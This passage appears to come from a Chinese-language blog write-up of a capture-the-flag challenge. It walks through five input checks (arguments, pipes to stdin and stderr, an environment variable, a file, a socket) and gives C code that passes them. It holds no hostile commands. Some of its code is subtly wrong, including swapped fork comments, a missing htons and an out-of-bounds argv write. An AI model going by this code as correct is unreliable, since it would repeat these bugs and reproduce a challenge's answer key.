class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">	cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here&#x27;s your flag</span></span><br><span class="line">	system(<span class="string">&quot;/bin/cat flag&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一共5个阶段，都是一些与程序输入相关的方法：命令行参数、标准输入、环境变量、文件、网络。下面一一分解，这里我写了一个C语言版本的payload，这部分sock的编程C语言版本我更熟悉些。</p>
<ul>
<li>第一阶段：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv		1.首先参数是100个 2.&#x27;A&#x27;对应值为\x00 3.&#x27;B&#x27;对应值为\x20\x0a\x0d</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);	</span><br></pre></td></tr></table></figure>
<ul>
<li>第一部分很简单，直接构造一个100字节大小的数组，填入相应的值即可，那我们这么写：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//step1 argv</span></span><br><span class="line"><span class="type">char</span> *argv[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)&#123;		<span class="comment">//先进行填充，在定位地修改</span></span><br><span class="line">    argv[i] = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;/home/input2/input&quot;</span>	<span class="comment">//指定要运行的程序</span></span><br><span class="line">argv[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&quot;\x00&quot;</span>;			   <span class="comment">//argv[&#x27;A&#x27;] 即下标为A的ascii码值</span></span><br><span class="line">argv[<span class="string">&#x27;B&#x27;</span>] = <span class="string">&quot;\x20\x0a\x0d&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二阶段:</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>从标准输入读取4个字节到buf，其内容必须和<code>\x00\x0a\x00\xff</code>相等(memcmp返回0)，再从错误输出中读取4个字节到buf，这次内容必须和<code>\x00\x0a\x02\xff</code>相等。</p>
<p>要从标准错误输出中读取数据，就得有标准错误输出，而正常运行中是不会有这种输出的，所以我们需要自己构建管道进行重定向。</p>
<p>pip机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line">  pipe()  creates  a  pipe, a unidirectional data channel that can be used <span class="keyword">for</span> interprocess communication.  The <span class="built_in">array</span> pipefd is used to <span class="keyword">return</span> two file descriptors referring to the ends of the pipe.  </span><br><span class="line">  pipefd[<span class="number">0</span>] refers to the read end of the pipe.  pipefd[<span class="number">1</span>] refers to the write end of the pipe. Data written to the write end of the pipe  is  buffered  by  the kernel until it is read from the read end of the pipe. </span><br><span class="line">  On success, zero is returned.  On error, <span class="number">-1</span> is returned, errno is <span class="built_in">set</span> appropriately, and pipefd is left unchanged.</span><br></pre></td></tr></table></figure>
<p>这个学过操作系统的基本都有概念，pipe函数会创建一个管道，传入的数组中有两个字节的大小空间，其中pipefd[0]代表读端，pipefd[1]代表写端，<strong>二者实质就是文件描述符</strong>。写入的数据会被内核缓存，直到读端读取。下面我们构造一个管道，因为这一步存在两个读入(标准输入和标准输出)，所以得创建两个管道。：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//step2 stdio</span></span><br><span class="line"><span class="type">int</span> pip_stdin[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> pip_stderr[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDIN_READ pip_stdin[0]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDIN_WRITE pip_stdin[1]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDERR_READ pip_stderr[0]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDERR_WRITE pip_stderr[1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe(pip_stdin) &amp;&amp; !pipe(pip_stderr))&#123;		<span class="comment">//创建管道成功</span></span><br><span class="line">    <span class="comment">//todo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们要有写和读这两个操作，所以我们建立一个子进程用来写数据，并且在父进程中将子进程的输入进行重定向。重定向操作需要使用函数dup2()，这个函数会将<code>oldfd</code>中的内容复制到<code>newfd</code>中，即重定向。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line">  The <span class="title function_">dup</span><span class="params">()</span> system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor <span class="keyword">for</span> the new descriptor.</span><br><span class="line">  The <span class="title function_">dup2</span><span class="params">()</span> system call performs the same task as <span class="title function_">dup</span><span class="params">()</span>, but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number  specified  in  newfd.</span><br><span class="line">  If the file descriptor newfd was previously open, it is silently closed before being reused.</span><br></pre></td></tr></table></figure>
<p>继续写代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//step2 stdio</span></span><br><span class="line"><span class="type">int</span> pip_stdin[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> pip_stderr[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDIN_READ pip_stdin[0]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDIN_WRITE pip_stdin[1]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDERR_READ pip_stderr[0]</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> STDERR_WRITE pip_stderr[1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe(pip_stdin) &amp;&amp; !pipe(pip_stderr))&#123;		<span class="comment">//创建管道成功</span></span><br><span class="line">    <span class="type">pid_t</span> child;</span><br><span class="line">    <span class="keyword">if</span> (child = fork())&#123;	<span class="comment">//子进程返回值为0</span></span><br><span class="line">        <span class="comment">//关闭两个读端</span></span><br><span class="line">        close(STDIN_READ);</span><br><span class="line">        close(STDERR_READ);</span><br><span class="line">        <span class="comment">//写入数据</span></span><br><span class="line">        write(STDIN_WRITE, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        write(STDERR_WRITE, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;		<span class="comment">//父进程</span></span><br><span class="line">        <span class="comment">//关闭两个写端</span></span><br><span class="line">        close(STDIN_WRITE);</span><br><span class="line">        close(STDERR_WRITE);</span><br><span class="line">        <span class="comment">//将数据进行重定向到标准输入与错误输出</span></span><br><span class="line">        dup2(STDIN_READ, <span class="number">0</span>);</span><br><span class="line">        dup2(STDERR_READ, <span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;/home/input2/input&quot;</span>, argv, envp);	<span class="comment">//这里执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第三阶段：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>获取环境变量<code>\xde\xad\xbe\xef</code>的值，其值必须为<code>\xca\xfe\xba\xbe</code>’。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//step3 env</span></span><br><span class="line"><span class="type">char</span> *envp[<span class="number">2</span>] = &#123;<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>, <span class="literal">NULL</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第四阶段：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>看一下fread()函数：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);</span><br><span class="line">...</span><br><span class="line">The function fread() reads nmemb items of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr.</span><br><span class="line">...</span><br><span class="line">On  success, fread() and fwrite() return the number of items read or written.  This number equals the number of bytes transferred only when size is 1.  If an error occurs, or the end of the file is reached, the return value is a short item count (or zero).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>以只读模式打开文件<code>\x0a</code>，从其中读取1个单位长度，每单位长度为4字节，到buf。对于返回值，因为这里单位长度设置的是4字节，所以返回值肯定不是1了，这样就过不去了.....</p>
<p>但是从man手册的描述中：<code>If an error occurs, or the end of the file is reached, the return value is a short item count (or zero).</code>所以想让这个返回值等于1，那么文件的内容就只能为1个单位(4字节)，这样读取的大小小于设定的一个单位，返回值就是1了。</p>
<p>之后会判断buf的内容是否为四个字节的<code>\x00</code>，那么文件中内容就只能写4个<code>\x00</code>了，逆着如法炮制:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//step4 file</span></span><br><span class="line">FILE *fp = open(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fwrite(<span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br></pre></td></tr></table></figure>
<ul>
<li>第五阶段：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="type">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span>	<span class="comment">//分别代表服务端和客户端的套接字结构</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);	<span class="comment">//申请一个TCP套接字</span></span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );	<span class="comment">//端口为命令行参数中&#x27;C&#x27;对应的那个值</span></span><br><span class="line"><span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;	<span class="comment">//套接字绑定</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);	<span class="comment">//这里只要不用常用端口就行</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);	<span class="comment">//监听 客户端数为1</span></span><br><span class="line"><span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);	</span><br><span class="line">cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);	<span class="comment">//接受一个客户端的连接</span></span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">//客户端发来的数据必须是4个字节</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">//且内容为\xde\xad\xbe\xef</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这一部分略麻烦点，input程序在这里是作为一服务端运行的，我们需要写相应的客户端程序，向服务端发送数据，你需要熟悉网络socket编程。代码：</p>
<p>现在命令行参数中添加一个变量来指明端口号：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">argv[<span class="string">&#x27;C&#x27;</span>] = <span class="number">6666</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后写一个简单的客户端程序：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PORT 6666</span></span><br><span class="line"><span class="type">int</span> cfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>] = <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>;	<span class="comment">//payload</span></span><br><span class="line">cfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);	<span class="comment">//申请客户端套接字</span></span><br><span class="line"><span class="keyword">if</span> (cfd == <span class="number">-1</span>)&#123;		<span class="comment">//申请失败</span></span><br><span class="line">    perror(<span class="string">&quot;socket request error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置服务端的信息</span></span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">server.sin_port = PORT;</span><br><span class="line"><span class="keyword">if</span> (connect(cfd, (<span class="keyword">struct</span> sockaddr*)&amp;server, <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;connect failed\n&quot;</span>);           <span class="comment">//连接被拒绝</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//连接成功，发送数据，发送后结束通信</span></span><br><span class="line">send(cfd, buf, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">close(cfd);</span><br></pre></td></tr></table></figure>
<p>这道题还是牵扯比较多的知识的，是一道很不错学习linux各种机制的习题。最终代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 6666</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//step1 argv</span></span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)&#123;    <span class="comment">//先进行填充，在定位地修改</span></span><br><span class="line">        argv[i] = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;/home/input2/input&quot;</span>;    <span class="comment">//指定要运行的程序</span></span><br><span class="line">    argv[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&quot;\x00&quot;</span>;       <span class="comment">//argv[&#x27;A&#x27;] 即下标为A的ascii码值</span></span><br><span class="line">    argv[<span class="string">&#x27;B&#x27;</span>] = <span class="string">&quot;\x20\x0a\x0d&quot;</span>;</span><br><span class="line">    argv[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&quot;6666&quot;</span>;       <span class="comment">//for step5 network using </span></span><br><span class="line">    argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> *envp[<span class="number">2</span>] = &#123;<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>, <span class="literal">NULL</span>&#125;;        <span class="comment">//for step3 env Using</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//step2 stdio</span></span><br><span class="line">    <span class="type">int</span> pip_stdin[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="type">int</span> pip_stderr[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> STDIN_READ pip_stdin[0]</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> STDIN_WRITE pip_stdin[1]</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> STDERR_READ pip_stderr[0]</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> STDERR_WRITE pip_stderr[1]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pipe(pip_stdin) &amp;&amp; !pipe(pip_stderr))&#123;    <span class="comment">//创建管道成功</span></span><br><span class="line">        <span class="type">pid_t</span> child;</span><br><span class="line">        <span class="keyword">if</span> (child = fork())&#123;    <span class="comment">//子进程返回值为0</span></span><br><span class="line">            <span class="comment">//关闭两个读端</span></span><br><span class="line">            close(STDIN_READ);</span><br><span class="line">            close(STDERR_READ);</span><br><span class="line">            <span class="comment">//写入数据</span></span><br><span class="line">            write(STDIN_WRITE, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            write(STDERR_WRITE, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;    <span class="comment">//父进程</span></span><br><span class="line">            <span class="comment">//关闭两个写端</span></span><br><span class="line">            close(STDIN_WRITE);</span><br><span class="line">            close(STDERR_WRITE);</span><br><span class="line">            <span class="comment">//将数据进行重定向到标准输入与错误输出</span></span><br><span class="line">            dup2(STDIN_READ, <span class="number">0</span>);</span><br><span class="line">            dup2(STDERR_READ, <span class="number">2</span>);</span><br><span class="line">            execve(<span class="string">&quot;/home/input2/input&quot;</span>, argv, envp);    <span class="comment">//这里执行</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//step4 file</span></span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Open file successfully!\n&quot;</span>);</span><br><span class="line">    fwrite(<span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//step5 network</span></span><br><span 